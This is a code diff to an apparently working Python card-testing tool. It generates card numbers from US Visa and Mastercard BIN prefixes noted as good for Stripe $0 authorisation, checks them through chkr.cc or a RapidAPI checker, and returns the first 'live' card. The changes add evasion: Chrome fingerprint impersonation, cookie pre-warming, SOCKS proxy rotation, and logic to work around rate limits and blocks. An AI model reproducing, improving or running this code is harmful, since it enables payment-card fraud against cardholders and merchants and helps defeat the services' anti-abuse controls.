@@ -23,8 +23,9 @@ from datetime import datetime
 import requests
 
 CHKR_API    = "https://api.chkr.cc/"
-CHKR_DELAY  = 4.0   # seconds between checks (avoid rate-limit 429)
-CHKR_MAX    = 25    # max cards to check per BIN
+CHKR_DELAY  = 15.0  # seconds between checks (avoid rate-limit 429)
+CHKR_MAX    = 8     # max cards to check per BIN (fail-fast)
+CHKR_SKIP_BIN_AFTER = 3  # skip BIN after N consecutive 429s
 
 # 代理端口列表 (int)，用于 chkr.cc 卡检测，空列表 = 直连
 # 可通过环境变量 CHKR_PROXY_PORTS=10800,10810 配置
@@ -33,6 +34,33 @@ CHKR_PROXY_PORTS: list = [
     int(p) for p in _os.environ.get("CHKR_PROXY_PORTS", "10910,10911,10912,10916").split(",")
     if p.strip().isdigit()
 ]
+RAPIDAPI_KEY = _os.environ.get("RAPIDAPI_KEY", "")  # RapidAPI key for bin-checker19
+
+# curl_cffi session cache (per proxy_port) — browser impersonation avoids 403/429
+_chkr_sessions: dict = {}
+
+def _get_chkr_session(proxy_port: int = 0):
+    """Return curl_cffi Session with browser fingerprint and site cookie pre-warm."""
+    if proxy_port not in _chkr_sessions:
+        try:
+            from curl_cffi import requests as _cr
+            s = _cr.Session(impersonate="chrome131")
+            if proxy_port:
+                _px = f"socks5://127.0.0.1:{proxy_port}"
+                s.proxies = {"http": _px, "https": _px}
+            try:
+                s.get("https://chkr.cc/", timeout=7,
+                      headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                               "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+                               "Accept": "text/html,application/xhtml+xml,*/*",
+                               "Accept-Language": "en-US,en;q=0.9",
+                               "Referer": "https://www.google.com/"})
+            except Exception:
+                pass
+            _chkr_sessions[proxy_port] = s
+        except ImportError:
+            _chkr_sessions[proxy_port] = None
+    return _chkr_sessions[proxy_port]
 
 # 默认 BIN 列表 — 美国 Visa/Mastercard，Stripe $0 auth 成功率较高
 DEFAULT_BINS = [
@@ -103,30 +131,49 @@ def gen_cards_from_bin(bin_prefix: str, count: int = CHKR_MAX) -> list:
 # ── chkr.cc 卡检测 ─────────────────────────────────────────────────────────
 def check_card_chkr(card_str: str, log=print, proxy_port: int = 0) -> dict:
     """
-    通过 chkr.cc API 检测单张卡。
+    Check a card via chkr.cc API (or RapidAPI if RAPIDAPI_KEY is set).
     card_str: "CARDNUM|MM|YYYY|CVV"
-    返回: {"code": 1=live/0=die/2=unknown/-1=error, "status": "...", "message": "..."}
+    Returns: {"code": 1=live/0=die/2=unknown/-1=error, "status": "...", "message": "..."}
     """
-    proxies = None
-    if proxy_port:
-        _p = f"socks5://127.0.0.1:{proxy_port}"
-        proxies = {"http": _p, "https": _p}
+    h_common = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+                      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Origin": "https://chkr.cc",
+        "Referer": "https://chkr.cc/",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+    }
+    # RapidAPI path (paid, reliable)
+    if RAPIDAPI_KEY:
+        try:
+            resp = requests.post(
+                "https://bin-checker19.p.rapidapi.com/check",
+                json={"data": card_str}, timeout=20,
+                headers={**h_common,
+                         "x-rapidapi-host": "bin-checker19.p.rapidapi.com",
+                         "x-rapidapi-key":  RAPIDAPI_KEY},
+            )
+            if resp.status_code == 200:
+                return resp.json()
+        except Exception as e:
+            log(f"[chkr] RapidAPI error: {e}", "warn")
+
+    # curl_cffi session with browser impersonation
+    sess = _get_chkr_session(proxy_port)
     try:
-        resp = requests.post(
-            CHKR_API,
-            json={"data": card_str},
-            timeout=25,
-            headers={
-                "Content-Type": "application/json",
-                "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Origin":       "https://chkr.cc",
-                "Referer":      "https://chkr.cc/",
-            },
-            proxies=proxies,
-        )
+        if sess is not None:
+            resp = sess.post(CHKR_API, json={"data": card_str},
+                             timeout=25, headers=h_common)
+        else:
+            proxies = None
+            if proxy_port:
+                _p = f"socks5://127.0.0.1:{proxy_port}"
+                proxies = {"http": _p, "https": _p}
+            resp = requests.post(CHKR_API, json={"data": card_str},
+                                 timeout=25, headers=h_common, proxies=proxies)
         if resp.status_code == 429:
-            log(f"[chkr] 限速 (429) proxy={proxy_port or 'direct'}，等待 8s...", "warn")
-            time.sleep(8)
+            log(f"[chkr] rate-limited (429) proxy={proxy_port or 'direct'}", "warn")
             return {"code": -1, "status": "rate_limited"}
         if resp.status_code != 200:
             return {"code": -1, "status": f"http_{resp.status_code}"}
@@ -138,15 +185,19 @@ def check_card_chkr(card_str: str, log=print, proxy_port: int = 0) -> dict:
 def find_live_card(bins: list, max_per_bin: int = CHKR_MAX,
                    delay: float = CHKR_DELAY, log=print):
     """
-    遍历 BIN 列表，找到第一张 live 卡后返回。
-    返回 "CARDNUM|MM|YYYY|CVV" 或 None。
+    Iterate BINs, return first live card found.
+    Fast-fails when proxy IPs are globally rate-limited.
+    Returns "CARDNUM|MM|YYYY|CVV" or None.
     """
-    log(f"[chkr] 开始查找 Live 卡，共 {len(bins)} 个 BIN，每个最多检测 {max_per_bin} 张", "info")
-    _proxy_cycle = list(CHKR_PROXY_PORTS) or [0]
+    log(f"[chkr] searching {len(bins)} BINs, max {max_per_bin} cards each", "info")
+    # Try direct (port=0) first, then proxy cycle
+    _proxy_cycle = [0] + list(CHKR_PROXY_PORTS) if CHKR_PROXY_PORTS else [0]
     _proxy_idx = 0
+    total_429 = 0
     for bin6 in bins:
-        log(f"[chkr] 测试 BIN {bin6} ...", "info")
+        log(f"[chkr] BIN {bin6} ...", "info")
         cards = gen_cards_from_bin(bin6, count=max_per_bin)
+        bin_429 = 0
         for i, card_str in enumerate(cards):
             preview = card_str[:10] + "xxxxxx|" + "|".join(card_str.split("|")[1:])
             log(f"[chkr] [{i+1}/{len(cards)}] {preview}", "dbg")
@@ -156,16 +207,31 @@ def find_live_card(bins: list, max_per_bin: int = CHKR_MAX,
             code    = result.get("code", -1)
             msg     = result.get("message", "")
             if code == 1:
-                log(f"[chkr] ✅ LIVE! {preview}  ({msg})", "ok")
+                log(f"[chkr] LIVE! {preview} ({msg})", "ok")
                 return card_str
             elif code == 0:
-                log(f"[chkr] ✗ die: {msg}", "dbg")
+                bin_429 = 0; total_429 = 0
+                log(f"[chkr] die: {msg}", "dbg")
             elif code == 2:
-                log(f"[chkr] ? unknown: {msg}", "dbg")
+                bin_429 = 0; total_429 = 0
+                log(f"[chkr] unknown: {msg}", "dbg")
             else:
-                log(f"[chkr] ⚠ err: {result.get('status','')}", "warn")
+                _st = result.get("status", "")
+                log(f"[chkr] err: {_st}", "warn")
+                if "rate_limited" in _st or "429" in _st:
+                    bin_429 += 1
+                    total_429 += 1
+                    if bin_429 >= CHKR_SKIP_BIN_AFTER:
+                        log(f"[chkr] BIN {bin6}: {bin_429} consecutive 429s, skipping", "warn")
+                        break
+                    # global block detection
+                    if total_429 >= len(bins) * CHKR_SKIP_BIN_AFTER:
+                        log("[chkr] all proxies globally rate-limited, aborting", "error")
+                        return None
+                    time.sleep(3)
+                    continue
             time.sleep(delay)
-    log("[chkr] 所有 BIN 均未找到 live 卡", "error")
+    log("[chkr] no live card found in any BIN", "error")
     return None
 
 
